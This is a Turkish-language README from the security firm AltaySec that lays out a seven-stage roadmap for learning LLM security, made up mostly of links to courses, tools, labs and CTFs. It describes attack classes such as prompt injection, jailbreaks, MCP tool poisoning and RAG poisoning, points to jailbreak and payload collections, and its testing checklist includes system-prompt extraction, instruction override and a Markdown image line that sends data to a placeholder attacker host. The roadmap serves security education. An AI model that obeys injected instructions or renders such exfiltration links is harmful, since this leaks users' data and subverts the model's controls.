<p align="center">
  <a href="https://altaysec.com.tr">
    <img src="https://altaysec.com.tr/logo.jpg" alt="AltaySec — Türkiye'nin İlk Yapay Zeka Güvenliği Şirketi" width="120">
  </a>
</p>

<p align="center">
  <strong><a href="https://altaysec.com.tr">AltaySec</a></strong> — Türkiye'nin İlk Yapay Zeka Güvenliği Şirketi<br>
  <sub>Kurucu &amp; Yazar: <a href="https://altaysec.com.tr/hakkimizda.html">Fevzi Ege Yurtsevenler</a> · Yapay Zeka Güvenliği Araştırmacısı</sub>
</p>

<p align="center">
  <a href="https://altaysec.com.tr"><img src="https://img.shields.io/badge/web-altaysec.com.tr-8b5cf6"></a>
  <a href="https://ai.altaysec.com.tr"><img src="https://img.shields.io/badge/LLM%20Security%20Akademi-ai.altaysec.com.tr-22c55e"></a>
  <a href="https://altaysec.com.tr/bootcamp.html"><img src="https://img.shields.io/badge/Bootcamp-kurumsal-blue"></a>
  <a href="https://altaysec.com.tr/arastirmalar/llm-security-roadmap.html"><img src="https://img.shields.io/badge/web%20sürümü-altaysec.com.tr-8b5cf6"></a>
</p>

> 🎯 **Bu repo, Türkiye'de LLM güvenliği alanına girmek isteyenler için yol haritasıdır.** 7 aşamalı öğrenme planı, araçlar, sertifikalar ve Türkiye'ye özgü kariyer fırsatları. Pratik eğitim için: [LLM Security Akademi (ai.altaysec.com.tr)](https://ai.altaysec.com.tr) — 5 öğrenme yolu, 14 modül, 35 lab.

---

# LLM Security Roadmap 2026
## Türkiye'nin İlk Türkçe Yapay Zeka Güvenlik Yol Haritası

**Yazar:** Fevzi Ege Yurtsevenler — Yapay Zeka Güvenliği Araştırmacısı, AltaySec Kurucusu  
**Yayın:** AltaySec | [altaysec.com.tr](https://altaysec.com.tr)  
**Tarih:** Nisan 2026  
**Seri:** LLM Security Temelleri #6  
**Kaynak:** [AI/ML Pentesting Roadmap 2026 Edition](https://github.com/anmolksachan/AI-ML-Free-Resources-for-Security-and-Prompt-Injection)

---

> Bu yol haritası; LLM (Büyük Dil Modeli) güvenliğini sıfırdan öğrenmek isteyen Türk siber güvenlik meraklıları ve profesyonelleri için hazırlanmıştır. Dünya standartlarındaki [AI/ML Pentesting Roadmap](https://github.com/anmolksachan/AI-ML-Free-Resources-for-Security-and-Prompt-Injection)'i baz alarak Türkçe perspektifle yeniden yorumlanmıştır.

---

## İçindekiler

1. [Ön Koşullar](#ön-koşullar)
2. [Aşama 1 — Temel](#-aşama-1--temel-ay-1-2)
3. [Aşama 2 — LLM Güvenlik Kavramları](#-aşama-2--llm-güvenlik-kavramları-ay-2-3)
4. [Aşama 3 — Prompt Injection ve LLM Saldırıları](#-aşama-3--prompt-injection-ve-llm-saldırıları-ay-3-5)
5. [Aşama 4 — Ajansal AI ve MCP Güvenliği](#-aşama-4--ajansal-ai-ve-mcp-güvenliği-ay-5-8)
6. [Aşama 5 — Uygulamalı Pratik](#-aşama-5--uygulamalı-pratik-sürekli)
7. [Aşama 6 — İleri Teknik Sömürü](#-aşama-6--i̇leri-teknik-sömürü-ay-8-12)
8. [Aşama 7 — Araştırma ve Bug Bounty](#-aşama-7--gerçek-dünya-araştırması-ve-bug-bounty-ay-9)
9. [Standartlar ve Çerçeveler](#standartlar-ve-çerçeveler)
10. [Araçlar](#araçlar)
11. [Kitaplar ve PDF'ler](#kitaplar-ve-pdfler)
12. [Video Kaynakları](#video-kaynakları)
13. [CTF ve Yarışmalar](#ctf-ve-yarışmalar)
14. [Bug Bounty Programları](#bug-bounty-programları)
15. [Topluluk ve Haberler](#topluluk-ve-haberler)
16. [Akademik Makaleler](#akademik-makaleler)
17. [Deneyim Düzeyine Göre Yol](#deneyim-düzeyine-göre-öğrenme-yolu)

---

## Ön Koşullar

LLM güvenliğine dalmadan önce aşağıdaki temellere sahip olman gerekiyor:

### Genel Güvenlik Temeli
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) — Ücretsiz, uygulamalı web güvenlik eğitimi (XSS, SQLi, SSRF vb.)
- [TryHackMe — Pre-Security Path](https://tryhackme.com/path/outline/presecurity)
- [HackTheBox Academy](https://academy.hackthebox.com/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)

### Python Programlama (Zorunlu)
- [Python for Everybody — Coursera](https://www.coursera.org/specializations/python)
- [Automate the Boring Stuff with Python](https://automatetheboringstuff.com/) — Ücretsiz online kitap
- [CS50P — Python — Harvard](https://cs50.harvard.edu/python/) — Ücretsiz

### API ve HTTP Temelleri
- REST API'ler, HTTP metodları, başlıklar ve kimlik doğrulama akışlarını anla
- [Postman Learning Center](https://learning.postman.com/)
- Araçlar: `curl`, `Burp Suite`, `Postman`

---

## 🟢 Aşama 1 — Temel (Ay 1-2)

### 1.1 Makine Öğrenmesi Temelleri

| Kaynak | Tür | Ücret |
|--------|-----|-------|
| [Machine Learning — Andrew Ng (Coursera)](https://www.coursera.org/learn/machine-learning) | Kurs | Ücretsiz denetim |
| [Introduction to ML — edX](https://www.edx.org/course/introduction-to-machine-learning) | Kurs | Ücretsiz denetim |
| [fast.ai Practical Deep Learning](https://course.fast.ai/) | Kurs | Ücretsiz |
| [Google Machine Learning Crash Course](https://developers.google.com/machine-learning/crash-course) | Kurs | Ücretsiz |
| [Kaggle ML Kursları](https://www.kaggle.com/learn) | Kurs | Ücretsiz |
| [3Blue1Brown — Neural Networks](https://www.youtube.com/playlist?list=PLZHQObOWTQDNU6R1_67000Dx_ZCJB-3pi) | Video | Ücretsiz |

### 1.2 Büyük Dil Modellerini (LLM) Anlamak

Onlara saldırmadan önce nasıl "düşündüklerini" anlamak gerekiyor.

| Kaynak | Tür | Ücret |
|--------|-----|-------|
| [Andrej Karpathy — Intro to LLMs](https://www.youtube.com/watch?v=zjkBMFhNj_g) | Video | Ücretsiz |
| [Andrej Karpathy — Let's Build GPT](https://www.youtube.com/watch?v=kCc8FmEb1nY) | Video | Ücretsiz |
| [Hugging Face NLP Kursu](https://huggingface.co/learn/nlp-course) | Kurs | Ücretsiz |
| [LLM University by Cohere](https://llmu.cohere.com/) | Kurs | Ücretsiz |
| [Prompt Engineering Guide](https://www.promptingguide.ai/) | Rehber | Ücretsiz |

---

## 🟡 Aşama 2 — LLM Güvenlik Kavramları (Ay 2-3)

### 2.1 Temel Güvenlik Çerçeveleri

| Kaynak | Açıklama | Link |
|--------|----------|------|
| OWASP LLM Top 10 (2025) | LLM zafiyetlerinin temel referansı | [genai.owasp.org](https://genai.owasp.org/) |
| OWASP GenAI Red Teaming Guide | Pratik red teaming metodolojisi | [owasp.org](https://owasp.org/www-project-top-10-for-large-language-model-applications/) |
| MITRE ATLAS Matrisi | AI adversarial tehdit matrisi | [atlas.mitre.org](https://atlas.mitre.org/matrices/ATLAS/) |
| NIST AI Risk Management Framework | Federal AI risk rehberi | [airc.nist.gov](https://airc.nist.gov/Home) |
| IBM — AI Security Overview | AI güvenliğe giriş | [ibm.com/topics/ai-security](https://www.ibm.com/topics/ai-security) |
| AI Village — LLM Threat Modeling | LLM tehdit modelleme | [aivillage.org](https://aivillage.org/large%20language%20models/threat-modeling-llm/) |
| Adversa AI 2025 Security Report | Gerçek dünya AI olayları | [adversa.ai](https://adversa.ai/blog/adversa-ai-unveils-explosive-2025-ai-security-incidents-report-revealing-how-generative-and-agentic-ai-are-already-under-attack/) |

### 2.2 Temel Saldırı Yüzeyi

LLM sistemlerindeki temel saldırı vektörleri:

- **Prompt Injection** — Girdi manipülasyonuyla LLM davranışını değiştirme
- **Indirect Prompt Injection (IPI)** — Dokümanlar, web içeriği, e-postalar ve RAG pipeline'ları üzerinden saldırı
- **Jailbreaking** — Güvenlik filtrelerini ve guardrail'leri aşma
- **Multi-Turn Saldırılar** — Uzun konuşmalar boyunca kademeli manipülasyon (%92 başarı oranı, 2025)
- **Tool Poisoning** — MCP araç açıklamalarına zararlı talimat enjeksiyonu
- **Model Inversion** — Eğitim verilerini modelden geri çekme
- **Membership Inference** — Verinin eğitim setinde olup olmadığını belirleme
- **Data Poisoning** — Eğitim verisini bozarak davranışı etkileme
- **Model Extraction** — API sorguları yoluyla modeli kopyalama
- **Supply Chain Saldırıları** — Hugging Face gibi platformlardaki zararlı modeller
- **MCP Server Exploitation** — Araç zehirleme, kaynak hırsızlığı, konuşma ele geçirme
- **AI IDE Saldırıları** — Cursor, GitHub Copilot, Claude Code üzerinden saldırı
- **RAG Poisoning** — Retrieval-augmented generation pipeline'larına zararlı içerik

### 2.3 MLOps ve Altyapı Güvenliği

- [From MLOps to MLOops — JFrog](https://jfrog.com/blog/from-mlops-to-mloops-exposing-the-attack-surface-of-machine-learning-platforms/)
- [Offensive ML Playbook](https://wiki.offsecml.com/Welcome+to+the+Offensive+ML+Playbook)
- [AI Exploits — ProtectAI](https://github.com/protectai/ai-exploits)
- [Awesome AI Security — ottosulin](https://github.com/ottosulin/awesome-ai-security)

---

## 🟠 Aşama 3 — Prompt Injection ve LLM Saldırıları (Ay 3-5)

### 3.1 Prompt Injection'ı Derinlemesine Anla

- [OWASP LLM01:2025 Prompt Injection](https://genai.owasp.org/llmrisk/llm01-prompt-injection/) — Ajansal sistemler için güncellenmiş temel referans
- [IBM Guide on Prompt Injection](https://www.ibm.com/topics/prompt-injection)
- [Simon Willison — Prompt Injection Explained](https://simonwillison.net/2023/May/2/prompt-injection-explained/)
- [Prompt Injection in 2026: Why the Attack Surface Keeps Growing](https://notchrisgroves.com/prompt-injection-2026-attack-surface/)
- [Learn Prompting — Prompt Hacking and Injection](https://learnprompting.org/docs/prompt_hacking/injection)
- [PortSwigger LLM Attacks](https://portswigger.net/web-security/llm-attacks)
- [NCC Group — Exploring Prompt Injection Attacks](https://research.nccgroup.com/2022/12/05/exploring-prompt-injection-attacks/)
- [Bugcrowd — AI Vulnerability Deep Dive: Prompt Injection](https://www.bugcrowd.com/blog/ai-vulnerability-deep-dive-prompt-injection/)
- [Prompt Injection Cheat Sheet — Seclify](https://blog.seclify.com/prompt-injection-cheat-sheet/)
- [Don't You (Forget NLP) — Dropbox Tech](https://dropbox.tech/machine-learning/prompt-injection-with-control-characters-openai-chatgpt-llm)

### 3.2 Jailbreak Teknikleri

- **DAN (Do Anything Now)** — Klasik jailbreak: [Chatgpt-DAN Repo](https://github.com/alexisvalentino/Chatgpt-DAN)
- **Rol-Yapma / Persona Manipülasyonu**
- **Token Kaçakçılığı (Token Smuggling)** — Filtreleri atlatmak için talimatları kodlama
- **Prompt Sızıntısı (Prompt Leaking)** — Sistem promptunu çıkarma
- **Multi-Turn Jailbreaks** — Ardışık konuşmalar boyunca modeli yönlendirme (>%90 bypass oranı)
- [WideOpenAI — Jailbreak Koleksiyonu](https://github.com/WibblyOWobbly/WideOpenAI)
- [PayloadsAllTheThings — Prompt Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/Prompt%20Injection/)
- [PALLMs — LLM Saldırı Payloadları](https://github.com/mik0w/pallms/)

### 3.3 Dolaylı (Indirect) Prompt Injection

E-postalar, dokümanlar, web siteleri ve RAG parçaları üzerinden kötü niyetli talimat enjeksiyonu.

- [Greshake — LLM Security / Not What You've Signed Up For](https://github.com/greshake/llm-security)
- [Embrace The Red — Blog](https://embracethered.com/blog/)
- [GitHub Copilot Chat: Prompt Injection to Data Exfiltration](https://embracethered.com/blog/posts/2024/github-copilot-chat-prompt-injection-data-exfiltration/)
- [Indirect Prompt Injection Through MCP Tools: A Defense Guide](https://www.stackone.com/blog/indirect-prompt-injection-mcp-tools-defense)
- [CrowdStrike — Indirect Prompt Injection Attacks](https://www.crowdstrike.com/en-us/blog/indirect-prompt-injection-attacks-hidden-ai-risks/)
- [Lakera — Indirect Prompt Injection: The Hidden Threat](https://www.lakera.ai/blog/indirect-prompt-injection)

### 3.4 İleri Prompt Saldırı Teknikleri

- [Design Patterns for Securing LLM Agents Against Prompt Injection](https://simonwillison.net/2025/Jun/13/prompt-injection-design-patterns/)
- [OpenAI — Hardening Atlas Against Prompt Injection Attacks](https://openai.com/index/hardening-atlas-against-prompt-injection/)
- [Bugcrowd Ultimate Guide to AI Security (PDF)](https://www.bugcrowd.com/wp-content/uploads/2024/04/Ultimate-Guide-AI-Security.pdf)
- [Snyk OWASP Top 10 LLM (PDF)](https://go.snyk.io/rs/677-THP-415/images/owasp-top-10-llm.pdf)
- [Vanna.AI Prompt Injection RCE — JFrog](https://jfrog.com/blog/prompt-injection-attack-code-execution-in-vanna-ai-cve-2024-5565/)

---

## 🔴 Aşama 4 — Ajansal AI ve MCP Güvenliği (Ay 5-8)

> **Bu 2025-2026'nın en hızlı büyüyen ve en tehlikeli saldırı yüzeyidir.**

### 4.1 Neden Ajansal AI Her Şeyi Değiştiriyor?

Ajansal AI sistemleri "algıla-değerlendir-karar ver-eyleme geç" döngüsünde çalışır. Başarılı bir injection şunlara yol açabilir:
- Uzaktan Kod Çalıştırma (RCE)
- Özel repolardan veri sızdırma
- İzinsiz finansal işlemler
- Çok-ajanlı pipeline'lar boyunca yanal hareket

Temel okumalar:
- [AI Agent Attacks in Q4 2025 — eSecurity Planet](https://www.esecurityplanet.com/artificial-intelligence/ai-agent-attacks-in-q4-2025-signal-new-risks-for-2026/)
- [Enterprises Are Racing to Secure Agentic AI — Help Net Security](https://www.helpnetsecurity.com/2026/02/23/ai-agent-security-risks-enterprise/)
- [Adversa AI 2025 AI Security Incidents Report](https://adversa.ai/blog/adversa-ai-unveils-explosive-2025-ai-security-incidents-report-revealing-how-generative-and-agentic-ai-are-already-under-attack/)

### 4.2 MCP (Model Context Protocol) Güvenliği

MCP'ye özgü saldırı sınıfları:
- **Araç Zehirleme (Tool Poisoning)** — Araç `description` alanlarına zararlı talimatlar gömme
- **Araç Gölgeleme (Tool Shadowing)** — Meşru bir araçla aynı isimde zararlı araç kaydetme
- **Kaynak Hırsızlığı** — MCP örneklemesini kötüye kullanma
- **Konuşma Ele Geçirme** — Güvenliği ihlal edilmiş MCP sunucuları kalıcı talimatlar enjekte eder
- **Çapraz MCP Kontaminasyonu** — Bir MCP sunucusu diğerinin davranışını geçersiz kılar

Kaynaklar:
- [Palo Alto Unit 42 — MCP Attack Vectors](https://unit42.paloaltonetworks.com/model-context-protocol-attack-vectors/)
- [Checkmarx — 11 Emerging AI Security Risks with MCP](https://checkmarx.com/zero-post/11-emerging-ai-security-risks-with-mcp-model-context-protocol/)
- [MCP Prompt Injection: How AI Gets Hacked (YouTube)](https://www.youtube.com/watch?v=bO-7DB-3dL8)
- [ToxicSkills: Snyk Finds Malware in 36% of AI Agent Skills](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/)

### 4.3 AI IDE ve Kodlama Asistanı Güvenliği

- **Rules File Backdoor** — `.cursor/rules` gibi dosyalar zararlı talimatlarla zehirlenebilir
- **CVE-2025-53773** — GitHub Copilot RCE (CVSS 9.6) via prompt injection
- **CVE-2025-54135** — Cursor indirect prompt injection via MCP config → RCE

Kaynaklar:
- [Rules File Backdoor — Cursor/Copilot](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor)
- [GitGuardian — Can GitHub Copilot Leak Secrets?](https://blog.gitguardian.com/yes-github-copilot-can-leak-secrets/)
- [Your AI, My Shell — arXiv 2025](https://arxiv.org/html/2509.22040v1)

### 4.4 Çok-Ajanlı ve RAG Pipeline Saldırıları

- **PoisonedRAG** (USENIX Security 2025) — RAG veritabanlarına zehirli metin enjeksiyonu
- **A2A Protokol Kötüye Kullanımı** — Google'ın Agent2Agent protokolündeki yeni saldırı yüzeyleri
- [ScienceDirect — From Prompt Injections to Protocol Exploits](https://www.sciencedirect.com/science/article/pii/S2405959525001997)

### 4.5 Meta'nın "İki Kural" Çerçevesi

Ajan şu üç özellikten en fazla ikisine sahip olabilir:
- (A) Güvenilmeyen girdileri işleme
- (B) Hassas verilere erişim
- (C) Harici durumu değiştirme yeteneği

Okuma: [Meta — Practical AI Agent Security](https://ai.meta.com/blog/practical-ai-agent-security/)

---

## 🛠️ Aşama 5 — Uygulamalı Pratik (Sürekli)

### 5.1 Etkileşimli Platformlar ve Oyunlar

| Platform | Açıklama | Link |
|----------|----------|------|
| Gandalf (Lakera) | 8 seviyeli şifre çıkarma oyunu | [gandalf.lakera.ai](https://gandalf.lakera.ai/) |
| Prompt Airlines | Gamifikasyon tabanlı öğrenme | [promptairlines.com](https://promptairlines.com/) |
| Crucible (Dreadnode) | Etkileşimli AI güvenlik zorlukları | [crucible.dreadnode.io](https://crucible.dreadnode.io/) |
| Immersive Labs AI | Yapılandırılmış AI güvenlik egzersizleri | [prompting.ai.immersivelabs.com](https://prompting.ai.immersivelabs.com/) |
| Secdim AI Games | Web tabanlı AI güvenlik oyunları | [play.secdim.com/game/ai](https://play.secdim.com/game/ai) |
| HackAPrompt | Topluluk prompt injection yarışması | [hackaprompt.com](https://www.hackaprompt.com/) |
| PortSwigger LLM Labs | Uygulamalı web LLM saldırısı labs | [portswigger.net/web-security/llm-attacks](https://portswigger.net/web-security/llm-attacks) |
| PromptTrace | 7 lab + 15 seviyeli CTF, gerçek LLM'lerle | [prompttrace.airedlab.com](https://prompttrace.airedlab.com/) |
| CrowdStrike AI Unlocked | Ajan odaklı zorluklar | [crowdstrike.com](https://www.crowdstrike.com/en-us/blog/introducing-ai-unlocked-interactive-prompt-injection-challenge/) |
| 8ksec AI/LLM Challenges | Yapılandırılmış AI/ML CTF | [academy.8ksec.io](https://academy.8ksec.io/course/ai-exploitation-challenges) |

### 5.2 Kasıtlı Savunmasız Projeler

| Repo | Açıklama | Link |
|------|----------|------|
| Damn Vulnerable LLM Agent | Kasıtlı savunmasız ReAct LLM ajan | [github.com/WithSecureLabs/damn-vulnerable-llm-agent](https://github.com/WithSecureLabs/damn-vulnerable-llm-agent) |
| ScottLogic Prompt Injection Playground | Yerel prompt injection lab | [github.com/ScottLogic/prompt-injection](https://github.com/ScottLogic/prompt-injection) |
| Greshake LLM Security Tools | Proof-of-concept saldırılar | [github.com/greshake/llm-security](https://github.com/greshake/llm-security) |
| ctf-prompt-injection | Dockerize CTF, Ollama + yerel LLM | [github.com/CharlesTheGreat77/ctf-prompt-injection](https://github.com/CharlesTheGreat77/ctf-prompt-injection) |
| ai-prompt-ctf | RAG, fonksiyon çağrısı, ReAct ajanlara dolaylı enjeksiyon | [github.com/c-goosen/ai-prompt-ctf](https://github.com/c-goosen/ai-prompt-ctf) |

### 5.3 Eğitimler ve Pratik Kaynaklar

- [Google AI Red Teaming Walkthrough (PDF)](https://services.google.com/fh/files/blogs/google_ai_red_team_digital_final.pdf)
- [Spikee: Testing LLM Apps for Prompt Injection — WithSecure](https://labs.withsecure.com/tools/spikee) — Burp Suite entegrasyonlu
- [How AI Prompt Injection Works | Hands-on (YouTube)](https://www.youtube.com/watch?v=fCpAr2OylDw)
- [Prompt Injection in LLM Agents: ReAct, Langchain (YouTube)](https://www.youtube.com/watch?v=43qfHaKh0Xk)

### 5.4 Çalışılacak CTF Writeup'ları

- [CTF Writeup — HackPack CTF 2024 LLM Edition](https://medium.com/@embossdotar/ctf-writeup-hackpack-ctf-2024-llm-edition-yellowdog-1-db02a36e1051)
- [LLM Pentest Writeups — System Weakness](https://systemweakness.com/large-language-model-llm-pen-testing-part-i-2ef96acb6763)

---

## 🔬 Aşama 6 — İleri Teknik Sömürü (Ay 8-12)

### 6.1 Ajan ve Araç Entegrasyon Saldırıları

- [LLM Pentest: Ajan Entegrasyonu ile RCE — BlazeInfoSec](https://www.blazeinfosec.com/post/llm-pentest-agent-hacking/)
- [Prompt Injection Attacks on Agentic Coding Assistants (SoK, arXiv 2026)](https://arxiv.org/html/2601.17548v1)

### 6.2 LLM'ler Aracılığıyla Veri Sızdırma

- [Google AI Studio: LLM-Powered Data Exfiltration](https://embracethered.com/blog/posts/2024/google-ai-studio-data-exfiltration-now-fixed/)
- [Hacking Google Bard — From Prompt Injection to Data Exfiltration](https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/)
- [GitHub Copilot Chat Data Exfiltration](https://embracethered.com/blog/posts/2024/github-copilot-chat-prompt-injection-data-exfiltration/)
- [ChatGPT Plugins: Data Exfiltration via Images](https://embracethered.com/blog/posts/2023/chatgpt-webpilot-data-exfil-via-markdown-injection/)

### 6.3 Adversarial Makine Öğrenmesi

- [CleverHans](https://github.com/cleverhans-lab/cleverhans) — Adversarial örnek kütüphanesi
- [ART (Adversarial Robustness Toolbox) — IBM](https://github.com/Trusted-AI/adversarial-robustness-toolbox)
- [Foolbox](https://github.com/bethgelab/foolbox) — Python adversarial saldırı araçları

### 6.4 Tedarik Zinciri ve Model Dosya Saldırıları

- Model dosyalarına (pickle, safetensors) gömülü zararlı kod, yükleme sırasında çalışabilir
- [ModelScan — ProtectAI](https://github.com/protectai/modelscan)

---

## 🏆 Aşama 7 — Gerçek Dünya Araştırması ve Bug Bounty (Ay 9+)

### 7.1 Dikkat Çeken Araştırmalar ve Açıklamalar

- [We Hacked Google AI for $50,000 — LandH](https://www.landh.tech/blog/20240304-google-hack-50000/)
- [New Google Gemini Content Manipulation Vulnerabilities — HiddenLayer](https://hiddenlayer.com/research/new-google-gemini-content-manipulation-vulns-found/#Overview)
- [My LLM Bug Bounty Journey on Hugging Face Hub](https://medium.com/@zpbrent/my-llm-bug-bounty-journey-on-hugging-face-hub-via-protect-ai-9f3a1bc72c2e)
- [Lakera Real World LLM Exploits (PDF)](https://lakera-marketing-public.s3.eu-west-1.amazonaws.com/Lakera%2BAI%2B-%2BReal%2BWorld%2BLLM%2BExploits%2B(Jan%2B2024)-min.pdf)
- [AI Penetration Testing: A Complete Guide — HackingDream](https://www.hackingdream.net/2026/03/ai-penetration-testing-complete-guide-to-ai-red-teaming.html)

### 7.2 LLM Zafiyeti Bulma Metodolojisi

Bir LLM uygulamasını değerlendirirken test edilecekler:

1. **Sistem promptu çıkarma** — Gizli sistem promptunu sızdırabilir misin?
2. **Talimat geçersiz kılma** — Sistem seviyesi talimatları yok sayabilir misin?
3. **Eklenti/araç kötüye kullanımı** — SSRF, RCE, SQLi için test et
4. **MCP araç zehirleme** — Araç açıklamalarına talimat enjekte edebilir misin?
5. **Markdown veri sızdırma** — UI `![](https://saldirgan.com?q=...)` render ediyor mu?
6. **Kalıcı injection** — Bellek/RAG üzerinden kalıcı talimat enjekte edebilir misin?
7. **PII sızıntısı** — Model eğitim verisini ifşa ediyor mu?
8. **Çok kiracılı veri sızıntısı** — Başka kullanıcıların bağlamına erişebilir misin?
9. **Multi-turn tırmanma** — Konuşma boyunca modeli yönlendirebilir misin?

---

## Standartlar ve Çerçeveler

| Kaynak | Açıklama | Link |
|--------|----------|------|
| OWASP LLM Top 10 (2025) | Ajansal sistemler için güncellenmiş top 10 | [genai.owasp.org](https://genai.owasp.org/) |
| MITRE ATLAS | AI adversarial tehdit matrisi | [atlas.mitre.org](https://atlas.mitre.org/matrices/ATLAS/) |
| NIST AI RMF | ABD Federal AI risk yönetimi | [airc.nist.gov](https://airc.nist.gov/Home) |
| OWASP AI Exchange | Endüstriler arası AI güvenlik rehberi | [owaspai.org](https://owaspai.org/) |
| OWASP GenAI Red Teaming Guide | Pratik red teaming metodolojisi | [owasp.org](https://owasp.org/www-project-top-10-for-large-language-model-applications/) |
| Google SAIF | Google'ın güvenli AI çerçevesi | [safety.google](https://safety.google/cybersecurity-advancements/saif/) |
| ENISA AI Threat Landscape | AB AI tehdit manzarası | [enisa.europa.eu](https://www.enisa.europa.eu/publications/enisa-threat-landscape-for-artificial-intelligence) |

---

## Araçlar

### Saldırı Araçları

| Araç | Açıklama | Link |
|------|----------|------|
| Garak | LLM zafiyet tarayıcısı | [github.com/leondz/garak](https://github.com/leondz/garak) |
| PyRIT (Microsoft) | Python Risk Identification Toolkit | [github.com/Azure/PyRIT](https://github.com/Azure/PyRIT) |
| LLM Fuzzer | LLM fuzzing framework | [github.com/mnns/LLMFuzzer](https://github.com/mnns/LLMFuzzer) |
| PALLMs | LLM saldırı payloadları | [github.com/mik0w/pallms](https://github.com/mik0w/pallms/) |
| PromptInject | Prompt injection saldırı framework | [github.com/agencyenterprise/PromptInject](https://github.com/agencyenterprise/PromptInject) |
| PurpleLlama / CyberSecEval | Meta'nın LLM güvenlik değerlendirmesi | [github.com/facebookresearch/PurpleLlama](https://github.com/facebookresearch/PurpleLlama) |
| LLM Injector (Burp Suite) | Burp Suite eklentisi | [github.com/anmolksachan/LLMInjector](https://github.com/anmolksachan/LLMInjector) |
| Prompt Map | LLM uygulama güvenlik tarayıcısı | [github.com/utkusen/promptmap](https://github.com/utkusen/promptmap) |
| AgentSeal | Ajanlara 150 saldırı probu | [github.com/agentseal/agentseal](https://github.com/agentseal/agentseal) |
| Token Turbulenz | Prompt injection fuzzer | [github.com/wunderwuzzi23/token-turbulenz](https://github.com/wunderwuzzi23/token-turbulenz) |

### Savunma Araçları

| Araç | Açıklama | Link |
|------|----------|------|
| Rebuff | Prompt injection tespiti | [github.com/protectai/rebuff](https://github.com/protectai/rebuff) |
| NeMo Guardrails | NVIDIA guardrail framework | [github.com/NVIDIA/NeMo-Guardrails](https://github.com/NVIDIA/NeMo-Guardrails) |
| Lakera Guard | Ticari prompt injection koruması | [lakera.ai](https://www.lakera.ai/) |
| ModelScan (ProtectAI) | ML model dosyalarını zararlı kod için tara | [github.com/protectai/modelscan](https://github.com/protectai/modelscan) |
| Vigil LLM | Vektör benzerliği, YARA, transformer tabanlı | [github.com/deadbits/vigil-llm](https://github.com/deadbits/vigil-llm) |
| InjecGuard | SOTA injection tespiti | [github.com/safolab-wisc/injecguard](https://github.com/safolab-wisc/injecguard) |
| tldrsec/prompt-injection-defenses | Üretimde kullanılan savunma katalogu | [github.com/tldrsec/prompt-injection-defenses](https://github.com/tldrsec/prompt-injection-defenses) |

### Referans Listeleri

| Kaynak | Link |
|--------|------|
| Awesome LLM Security | [github.com/corca-ai/awesome-llm-security](https://github.com/corca-ai/awesome-llm-security) |
| Awesome AI Security | [github.com/ottosulin/awesome-ai-security](https://github.com/ottosulin/awesome-ai-security) |
| LLM Hacker's Handbook | [github.com/forcesunseen/llm-hackers-handbook](https://github.com/forcesunseen/llm-hackers-handbook) |
| PayloadsAllTheThings — Prompt Injection | [swisskyrepo.github.io/PayloadsAllTheThings/Prompt%20Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/Prompt%20Injection/) |
| Awesome Prompt Injection | [github.com/FonduAI/awesome-prompt-injection](https://github.com/FonduAI/awesome-prompt-injection) |

---

## Kitaplar ve PDF'ler

| Kaynak | Link |
|--------|------|
| LLM Hacker's Handbook | [github.com/forcesunseen/llm-hackers-handbook](https://github.com/forcesunseen/llm-hackers-handbook) |
| OWASP Top 10 for LLM (Snyk) | [PDF](https://go.snyk.io/rs/677-THP-415/images/owasp-top-10-llm.pdf) |
| Bugcrowd Ultimate Guide to AI Security | [PDF](https://www.bugcrowd.com/wp-content/uploads/2024/04/Ultimate-Guide-AI-Security.pdf) |
| Lakera Real World LLM Exploits | [PDF](https://lakera-marketing-public.s3.eu-west-1.amazonaws.com/Lakera%2BAI%2B-%2BReal%2BWorld%2BLLM%2BExploits%2B(Jan%2B2024)-min.pdf) |
| Google AI Red Team Walkthrough | [PDF](https://services.google.com/fh/files/blogs/google_ai_red_team_digital_final.pdf) |
| Adversarial Machine Learning — Goodfellow et al. | [arXiv](https://arxiv.org/abs/1412.6572) |
| AI Penetration Testing 2026 Guide | [HackingDream](https://www.hackingdream.net/2026/03/ai-penetration-testing-complete-guide-to-ai-red-teaming.html) |

---

## Video Kaynakları

| Kaynak | Link |
|--------|------|
| AI/LLM/ML Penetration Testing (Oynatma Listesi) | [YouTube](https://www.youtube.com/playlist?list=PL1Aj7oPl6slsd3Er7PfeOIEFYPDQvMRUf) |
| Andrej Karpathy — Intro to Large Language Models | [YouTube](https://www.youtube.com/watch?v=zjkBMFhNj_g) |
| DEF CON AI Village Konuşmaları | [YouTube](https://www.youtube.com/@AIVillage) |
| LiveOverflow — AI/ML Security | [YouTube](https://www.youtube.com/@LiveOverflow) |
| 3Blue1Brown — Neural Networks Serisi | [YouTube](https://www.youtube.com/playlist?list=PLZHQObOWTQDNU6R1_67000Dx_ZCJB-3pi) |
| John Hammond — AI Security Challenges | [YouTube](https://www.youtube.com/@_JohnHammond) |
| How AI Prompt Injection Works — Hands-On | [YouTube](https://www.youtube.com/watch?v=fCpAr2OylDw) |
| MCP Prompt Injection: How AI Gets Hacked | [YouTube](https://www.youtube.com/watch?v=bO-7DB-3dL8) |
| Prompt Injection in LLM Agents: ReAct, Langchain | [YouTube](https://www.youtube.com/watch?v=43qfHaKh0Xk) |

---

## CTF ve Yarışmalar

| Yarışma | Açıklama | Link |
|---------|----------|------|
| Crucible | Süregelen AI güvenlik zorlukları | [crucible.dreadnode.io](https://crucible.dreadnode.io/) |
| HackAPrompt | Yıllık prompt injection yarışması | [hackaprompt.com](https://www.hackaprompt.com/) |
| AI Village CTF (DEF CON) | DEF CON'daki yıllık AI güvenlik CTF'i | [aivillage.org](https://aivillage.org/) |
| Gandalf | 8 seviyeli LLM zorluğu | [gandalf.lakera.ai](https://gandalf.lakera.ai/) |
| Prompt Airlines | Gamifikasyon tabanlı injection zorlukları | [promptairlines.com](https://promptairlines.com/) |
| HackTheBox AI Challenges | HTB AI temaları | [hackthebox.com](https://www.hackthebox.com/) |
| PromptTrace Gauntlet | 15 seviyeli CTF, gerçek LLM'lerle | [prompttrace.airedlab.com](https://prompttrace.airedlab.com/) |
| CrowdStrike AI Unlocked | Ajan odaklı zorluklar | [crowdstrike.com](https://www.crowdstrike.com/en-us/blog/introducing-ai-unlocked-interactive-prompt-injection-challenge/) |
